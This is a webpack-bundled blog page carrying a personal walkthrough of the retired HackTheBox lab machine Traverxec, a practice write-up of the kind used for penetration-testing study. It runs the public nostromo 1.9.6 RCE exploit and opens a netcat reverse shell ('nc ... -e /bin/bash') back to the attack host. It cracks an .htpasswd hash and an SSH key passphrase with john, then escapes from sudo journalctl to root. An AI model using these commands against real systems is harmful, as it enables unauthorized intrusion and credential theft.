"use strict";(self.webpackChunkronamosa_github_io=self.webpackChunkronamosa_github_io||[]).push([[68020],{28453:(e,n,s)=>{s.d(n,{R:()=>i,x:()=>a});var t=s(96540);const r={},o=t.createContext(r);function i(e){const n=t.useContext(o);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),t.createElement(o.Provider,{value:n},e.children)}},39990:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>h,frontMatter:()=>i,metadata:()=>t,toc:()=>d});const t=JSON.parse('{"id":"hacker/hackthebox/traverxec","title":"HackTheBox Traverxec Walkthrough - Complete Linux Exploitation Guide","description":"Complete walkthrough of HackTheBox Traverxec machine. Learn web application exploitation, privilege escalation, and Linux penetration testing techniques.","source":"@site/docs/hacker/hackthebox/traverxec.md","sourceDirName":"hacker/hackthebox","slug":"/hacker/hackthebox/traverxec","permalink":"/docs/hacker/hackthebox/traverxec","draft":false,"unlisted":false,"editUrl":"https://github.com/ronamosa/ronamosa.github.io/edit/main/website/docs/hacker/hackthebox/traverxec.md","tags":[{"inline":true,"label":"hackthebox","permalink":"/docs/tags/hackthebox"},{"inline":true,"label":"linux","permalink":"/docs/tags/linux"},{"inline":true,"label":"web-exploitation","permalink":"/docs/tags/web-exploitation"},{"inline":true,"label":"privilege-escalation","permalink":"/docs/tags/privilege-escalation"},{"inline":true,"label":"walkthrough","permalink":"/docs/tags/walkthrough"}],"version":"current","lastUpdatedBy":"Ron Amosa","lastUpdatedAt":1771617957000,"sidebarPosition":1,"frontMatter":{"title":"HackTheBox Traverxec Walkthrough - Complete Linux Exploitation Guide","description":"Complete walkthrough of HackTheBox Traverxec machine. Learn web application exploitation, privilege escalation, and Linux penetration testing techniques.","keywords":["hackthebox traverxec","linux exploitation","web application security","privilege escalation","penetration testing","ctf walkthrough"],"tags":["hackthebox","linux","web-exploitation","privilege-escalation","walkthrough"],"sidebar_position":1},"sidebar":"docsSidebar","previous":{"title":"Holo Live","permalink":"/docs/hacker/tryhackme/hololive"},"next":{"title":"HackTheBox Legacy Walkthrough - Windows SMB Exploitation and MS08-067","permalink":"/docs/hacker/hackthebox/legacy"}}');var r=s(74848),o=s(28453);const i={title:"HackTheBox Traverxec Walkthrough - Complete Linux Exploitation Guide",description:"Complete walkthrough of HackTheBox Traverxec machine. Learn web application exploitation, privilege escalation, and Linux penetration testing techniques.",keywords:["hackthebox traverxec","linux exploitation","web application security","privilege escalation","penetration testing","ctf walkthrough"],tags:["hackthebox","linux","web-exploitation","privilege-escalation","walkthrough"],sidebar_position:1},a=void 0,l={},d=[{value:"Brief",id:"brief",level:2},{value:"KEY LEARNINGS",id:"key-learnings",level:2},{value:"RECON",id:"recon",level:2},{value:"NMAP",id:"nmap",level:3},{value:"EXPLOIT",id:"exploit",level:2},{value:"FOOTHOLD",id:"foothold",level:2},{value:"reverse shell (netcat)",id:"reverse-shell-netcat",level:3},{value:"LINUX ENUMERATION",id:"linux-enumeration",level:2},{value:"linpeas",id:"linpeas",level:3},{value:"CRACKING",id:"cracking",level:2},{value:".htpasswd",id:"htpasswd",level:3},{value:"MORE LINUX ENUM",id:"more-linux-enum",level:2},{value:"review linpeas.sh output",id:"review-linpeassh-output",level:3},{value:"nostromo config files",id:"nostromo-config-files",level:3},{value:"public folders",id:"public-folders",level:3},{value:"PRIVESC USER",id:"privesc-user",level:2},{value:"ssh keys",id:"ssh-keys",level:3},{value:"PRIVESC ROOT",id:"privesc-root",level:2},{value:"journalctl less",id:"journalctl-less",level:3}];function c(e){const n={a:"a",admonition:"admonition",code:"code",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,o.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.h2,{id:"brief",children:"Brief"}),"\n",(0,r.jsxs)(n.admonition,{title:"Description",type:"info",children:[(0,r.jsxs)(n.p,{children:["These are my notes for the Traverxec (Retired) Box on ",(0,r.jsx)(n.a,{href:"https://hackthebox.com",children:"HackTheBox"}),"."]}),(0,r.jsx)(n.p,{children:"Credits: S/o to tedd_918, hunterbot for the assist."}),(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{style:{textAlign:"center"},children:"OS"}),(0,r.jsx)(n.th,{style:{textAlign:"center"},children:"Level"}),(0,r.jsx)(n.th,{style:{textAlign:"center"},children:"Rating"})]})}),(0,r.jsx)(n.tbody,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{style:{textAlign:"center"},children:"Linux"}),(0,r.jsx)(n.td,{style:{textAlign:"center"},children:"Easy"}),(0,r.jsx)(n.td,{style:{textAlign:"center"},children:"4/5"})]})})]})]}),"\n",(0,r.jsx)(n.h2,{id:"key-learnings",children:"KEY LEARNINGS"}),"\n",(0,r.jsx)(n.admonition,{type:"tip",children:(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:["enumerating the system thoroughly and methodically is imperative e.g. ",(0,r.jsx)(n.code,{children:"sudo -l"}),", ",(0,r.jsx)(n.code,{children:"find -user <username />"})," (for files owned)"]}),"\n",(0,r.jsx)(n.li,{children:"learn and document cracking techniques to speed things up e.g. hashcat, ssh2john (new to me)"}),"\n",(0,r.jsx)(n.li,{children:"get better at ssh key vector techniques e.g. how to find keys, crack keys, use keys"}),"\n"]})}),"\n",(0,r.jsx)(n.h2,{id:"recon",children:"RECON"}),"\n",(0,r.jsx)(n.h3,{id:"nmap",children:"NMAP"}),"\n",(0,r.jsxs)(n.p,{children:["run it all: ",(0,r.jsx)(n.code,{children:"sudo nmap -v 10.10.10.165 -Pn -p- -sC -sV -O --min-rate=5000 -o nmap-traverxec.txt"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)\n| ssh-hostkey:\n|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)\n|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)\n|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)\n80/tcp open  http    nostromo 1.9.6\n|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34\n|_http-title: TRAVERXEC\n| http-methods:\n|_  Supported Methods: GET HEAD POST\n|_http-server-header: nostromo 1.9.6\n"})}),"\n",(0,r.jsxs)(n.p,{children:["I can see the ",(0,r.jsx)(n.code,{children:"http-server-header"})," information, and browse the website to also see: ",(0,r.jsx)(n.code,{children:"nostromo 1.9.6 at 10.10.10.165 Port 80"})," at the bottom of page."]}),"\n",(0,r.jsx)(n.h2,{id:"exploit",children:"EXPLOIT"}),"\n",(0,r.jsx)(n.p,{children:"Use searchsploit to find exploits:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ searchsploit nostromo 1.9.6\n--------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                   |  Path\n--------------------------------------------------------------------------------- ---------------------------------\nnostromo 1.9.6 - Remote Code Execution                                           | multiple/remote/47837.py\n--------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n"})}),"\n",(0,r.jsx)(n.p,{children:"Pull it down:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ searchsploit -m 47837\n  Exploit: nostromo 1.9.6 - Remote Code Execution\n      URL: https://www.exploit-db.com/exploits/47837\n     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py\nFile Type: Python script, ASCII text executable\n\nCopied to: /home/kali/Documents/RxHack/HTB/BOXES/TRAVERXEC/47837.py\n"})}),"\n",(0,r.jsxs)(n.p,{children:["I go to edit ",(0,r.jsx)(n.code,{children:"47837.py"})," and see:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'# Exploit Title: nostromo 1.9.6 - Remote Code Execution\n# Date: 2019-12-31\n# Exploit Author: Kr0ff\n# Vendor Homepage:\n# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz\n# Version: 1.9.6\n# Tested on: Debian\n# CVE : CVE-2019-16278\n\ncve2019_16278.py\n\n#!/usr/bin/env python\n\nimport sys\nimport socket\n\nart = """\n'})}),"\n",(0,r.jsxs)(n.p,{children:["So I Google ",(0,r.jsx)(n.code,{children:"cve2019_16278.py"})," and find ",(0,r.jsx)(n.a,{href:"https://raw.githubusercontent.com/AnubisSec/CVE-2019-16278/master/nostroSploit.py",children:"nostroSploit.py"})]}),"\n",(0,r.jsx)(n.p,{children:"Test it out, and I can get remote command execution on the target:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(rxhackk\u327fkali)-[~/\u2026/HTB/BOXES/TRAVERXEC/exploit]-[tun0: 10.10.16.2]\n\u2514\u2500$ python3 ./nostroSploit.py\nusage: nostroSploit.py [-h] host port [cmd]\nnostroSploit.py: error: the following arguments are required: host, port\n\n\u250c\u2500\u2500(rxhackk\u327fkali)-[~/\u2026/HTB/BOXES/TRAVERXEC/exploit]-[tun0: 10.10.16.2]\n\u2514\u2500$ python3 ./nostroSploit.py 10.10.10.165 80 whoami\n[+] Connecting to target\n[+] Sending malicious payload\nHTTP/1.1 200 OK\nDate: Thu, 24 Mar 2022 09:20:54 GMT\nServer: nostromo 1.9.6\nConnection: close\n\n\nwww-data\n"})}),"\n",(0,r.jsx)(n.h2,{id:"foothold",children:"FOOTHOLD"}),"\n",(0,r.jsx)(n.h3,{id:"reverse-shell-netcat",children:"reverse shell (netcat)"}),"\n",(0,r.jsx)(n.p,{children:"We get a bind shell from the target back to  our attack host:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'\u250c\u2500\u2500(rxhackk\u327fkali)-[~/\u2026/HTB/BOXES/TRAVERXEC/exploit]-[tun0: 10.10.16.2]\n\u2514\u2500$ python3 ./nostroSploit.py 10.10.10.165 80 "nc 10.10.16.2 443 -e /bin/bash"\n[+] Connecting to target\n[+] Sending malicious payload\n'})}),"\n",(0,r.jsx)(n.p,{children:"Set up our listener, and upgrade our shell once we're in there:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ sudo rlwrap nc -lnvp 443                                                                                   1 \u2a2f\nlistening on [any] 443 ...\nconnect to [10.10.16.2] from (UNKNOWN) [10.10.10.165] 37170\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nwhich python\n/usr/bin/python\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\nwww-data@traverxec:/usr/bin$\n"})}),"\n",(0,r.jsx)(n.h2,{id:"linux-enumeration",children:"LINUX ENUMERATION"}),"\n",(0,r.jsx)(n.p,{children:"I try these manual find lines first for various vulnerable file types:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"#World writable files directories\nfind / -writable -type d 2>/dev/null\nfind / -perm -222 -type d 2>/dev/null\nfind / -perm -o w -type d 2>/dev/null\n\n# World executable folder\nfind / -perm -o x -type d 2>/dev/null\n\n# World writable and executable folders\n\nfind / \\( -perm -o w -perm -o x \\) -type d 2>/dev/null\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"$ find / -perm /4000\n/usr/lib/openssh/ssh-keysign\n/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper\n/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/bin/sudo\n/usr/bin/umount\n/usr/bin/su\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/mount\n/usr/bin/chsh\n/usr/bin/passwd\n/usr/bin/chfn\n"})}),"\n",(0,r.jsx)(n.h3,{id:"linpeas",children:"linpeas"}),"\n",(0,r.jsxs)(n.p,{children:["From my attack host I do a ",(0,r.jsx)(n.code,{children:"sudo python3 http.server 80"})," where my tools are, and then ",(0,r.jsx)(n.code,{children:"wget"})," it from my reverse shell."]}),"\n",(0,r.jsxs)(n.p,{children:["I run ",(0,r.jsx)(n.code,{children:"linpeas.sh"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 SUID - Check easy privesc, exploits and write perms\n\u255a https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid\nstrings Not Found\nstrace Not Found\n-rwsr-xr-x 1 root root 427K Oct  6  2019 /usr/lib/openssh/ssh-keysign\n-r-sr-xr-x 1 root root 14K Nov 12  2019 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper\n-r-sr-xr-x 1 root root 14K Nov 12  2019 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper\n-rwsr-xr-- 1 root messagebus 50K Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper\n-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device\n-rwsr-xr-x 1 root root 154K Oct 12  2019 /usr/bin/sudo  ---\x3e  check_if_the_sudo_version_is_vulnerable\n-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  ---\x3e  BSD/Linux(08-1996)\n-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su\n-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd\n-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  ---\x3e  HP-UX_10.20\n-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  ---\x3e  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1\n699.24.8\n-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh\n-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  ---\x3e  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/\n9/Sun_Solaris_2.3_to_2.5.1(02-1997)\n-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  ---\x3e  SuSE_9.3/10\n"})}),"\n",(0,r.jsx)(n.p,{children:"this looks interesting:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Analyzing Htpasswd Files (limit 70)\n-rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd\ndavid:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/\n"})}),"\n",(0,r.jsx)(n.h2,{id:"cracking",children:"CRACKING"}),"\n",(0,r.jsx)(n.h3,{id:"htpasswd",children:".htpasswd"}),"\n",(0,r.jsxs)(n.p,{children:["Using ",(0,r.jsx)(n.code,{children:"john"})," the ripper, the ",(0,r.jsx)(n.code,{children:"rockyou.txt"})," wordlist and the hash copied to my attack host:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'RxHackk \u798f ~/Repos/RxHack/HTB/BOXES/TRAVERXEC/crack \u27a4 431f6ec|main\u26a1\n601 \ud83d\udc80 \xb1 \u27a4 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\nWarning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"\nUse the "--format=md5crypt-long" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])\nWill run 2 OpenMP threads\nPress \'q\' or Ctrl-C to abort, almost any other key for status\n0g 0:00:00:39 12.80% (ETA: 20:31:49) 0g/s 50608p/s 50608c/s 50608C/s auytun..autsang123\n0g 0:00:00:42 13.74% (ETA: 20:31:50) 0g/s 50443p/s 50443c/s 50443C/s AVISALARI..AUGUST6\n0g 0:00:03:05 65.97% (ETA: 20:31:25) 0g/s 50083p/s 50083c/s 50083C/s breech89..breeanna91\nNowonly4me       (david)\n1g 0:00:03:31 DONE (2022-04-05 20:30) 0.004736g/s 50107p/s 50107c/s 50107C/s Noyoudo..November^\nUse the "--show" option to display all of the cracked passwords reliably\nSession completed\n'})}),"\n",(0,r.jsxs)(n.p,{children:["I try ",(0,r.jsx)(n.code,{children:"su - david"})," and ",(0,r.jsx)(n.code,{children:"ssh david@10.10.10.165"}),", but this password doesn't work for those."]}),"\n",(0,r.jsx)(n.h2,{id:"more-linux-enum",children:"MORE LINUX ENUM"}),"\n",(0,r.jsx)(n.h3,{id:"review-linpeassh-output",children:"review linpeas.sh output"}),"\n",(0,r.jsx)(n.p,{children:"Run linpeas again and see what else I can find:"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Executing Linux Exploit Suggester\n\u255a https://github.com/mzet-/linux-exploit-suggester\ncat: write error: Broken pipe\ncat: write error: Broken pipe\n[+] [CVE-2019-13272] PTRACE_TRACEME\n\n   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903\n   Exposure: highly probable\n   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{kernel:5.0.9-*}\n   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip\n   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c\n   Comments: Requires an active PolKit agent.\n"})}),"\n",(0,r.jsx)(n.h3,{id:"nostromo-config-files",children:"nostromo config files"}),"\n",(0,r.jsxs)(n.p,{children:["So, after few hints from Tedd in chat, I review ",(0,r.jsx)(n.code,{children:"/var/nostromo/conf/"})," folder, and in the config file it has this:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# HOMEDIRS [OPTIONAL]\n\nhomedirs                /home\nhomedirs_public         public_www\n"})}),"\n",(0,r.jsxs)(n.p,{children:["According to nostromo, this means ",(0,r.jsx)(n.code,{children:"/home/*/public_www"})," is accessible to the ",(0,r.jsx)(n.code,{children:"www-data"})," user."]}),"\n",(0,r.jsx)(n.h3,{id:"public-folders",children:"public folders"}),"\n",(0,r.jsxs)(n.p,{children:["go here ",(0,r.jsx)(n.code,{children:"/home/david/public_www"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"cd /home/david/public_www\nls\nls\nindex.html  protected-file-area\nls -al\nls -al\ntotal 16\ndrwxr-xr-x 3 david david 4096 Oct 25  2019 .\ndrwx--x--x 5 david david 4096 Oct 25  2019 ..\n-rw-r--r-- 1 david david  402 Oct 25  2019 index.html\ndrwxr-xr-x 2 david david 4096 Oct 25  2019 protected-file-area\ncd protected-file-area\ncd protected-file-area\nls\nls\nbackup-ssh-identity-files.tgz\nwww-data@traverxec:/home/david/public_www/protected-file-area$\n"})}),"\n",(0,r.jsx)(n.h2,{id:"privesc-user",children:"PRIVESC USER"}),"\n",(0,r.jsx)(n.h3,{id:"ssh-keys",children:"ssh keys"}),"\n",(0,r.jsxs)(n.p,{children:["From ",(0,r.jsx)(n.code,{children:"/home/david/public_www"})," folder we found a backup of the users ssh keys."]}),"\n",(0,r.jsx)(n.p,{children:"Copy *.tgz to /tmp and then untar"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"tar xvf backup-ssh-identity-files.tgz\ntar xvf backup-ssh-identity-files.tgz\nhome/david/.ssh/\nhome/david/.ssh/authorized_keys\nhome/david/.ssh/id_rsa\nhome/david/.ssh/id_rsa.pub\n"})}),"\n",(0,r.jsxs)(n.p,{children:["copied ",(0,r.jsx)(n.code,{children:"id_rsa"})," to local machine, then ",(0,r.jsx)(n.code,{children:"ssh -i ./id_rsa david@10.10.10.165"})]}),"\n",(0,r.jsxs)(n.p,{children:["using the ",(0,r.jsx)(n.code,{children:".htpasswd"})," cracked hash doesn't work, so we try to crack the private key itself ",(0,r.jsx)(n.code,{children:"id_rsa"})]}),"\n",(0,r.jsxs)(n.p,{children:["use ",(0,r.jsx)(n.code,{children:"ssh2john"})," to convert the ",(0,r.jsx)(n.code,{children:"id_rsa"})," file to john crackable format: ",(0,r.jsx)(n.code,{children:"python2 /usr/share/john/ssh2john.py ../keys/id_pub > id_pub.hash"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"RxHackk \u798f ~/Repos/RxHack/HTB/BOXES/TRAVERXEC/crack \u27a4 431f6ec|main\u26a1\n697 \ud83d\udc80 \xb1 \u27a4 john --wordlist=/usr/share/wordlists/rockyou.txt id_pub.hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 2 OpenMP threads\nNote: This format may emit false positives, so it will keep trying even after\nfinding a possible candidate.\nPress 'q' or Ctrl-C to abort, almost any other key for status\nhunter           (../keys/id_pub)\n1g 0:00:00:36 DONE (2022-04-05 21:33) 0.02737g/s 392600p/s 392600c/s 392600C/sa6_123..*7\xa1Vamos!\nSession completed\n"})}),"\n",(0,r.jsxs)(n.p,{children:["re-try ssh, with the cracked ",(0,r.jsx)(n.code,{children:".htpasswd"})," passphrase:"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"708 \ud83d\udc80 \xb1 \u27a4 ssh -i ./id_rsa david@10.10.10.165\nEnter passphrase for key './id_rsa':\nLinux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64\ndavid@traverxec:~$\n"})}),"\n",(0,r.jsx)(n.h2,{id:"privesc-root",children:"PRIVESC ROOT"}),"\n",(0,r.jsx)(n.h3,{id:"journalctl-less",children:"journalctl less"}),"\n",(0,r.jsxs)(n.p,{children:["There a script in davids ",(0,r.jsx)(n.code,{children:"~/bin"})," directory with this command: ",(0,r.jsx)(n.code,{children:"/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service"})]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service\n-- Logs begin at Tue 2022-04-05 04:25:57 EDT, end at Tue 2022-04-05 06:22:22 EDT. --\nApr 05 04:56:24 traverxec sudo[5475]: pam_unix(sudo:auth): auth could not identify password for [www-data]\nApr 05 04:56:24 traverxec sudo[5475]: www-data : command not allowed ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=list\nApr 05 04:56:25 traverxec nologin[5516]: Attempted login by UNKNOWN on UNKNOWN\nApr 05 05:07:22 traverxec su[12115]: pam_unix(su-l:auth): authentication failure; logname= uid=33 euid=0 tty=pts/1 ruser=www-data r\nApr 05 05:07:24 traverxec su[12115]: FAILED SU (to root) www-data on pts/1\n!/bin/sh\n# id\nuid=0(root) gid=0(root) groups=0(root)\n# whoami\nroot\n#\n# cd /root\n# ls\nnostromo_1.9.6-1.deb  root.txt\n# cat root.txt\n9aa36a6d76f785dfd320a478f6e0d906\n#\n"})})]})}function h(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(c,{...e})}):c(e)}}}]);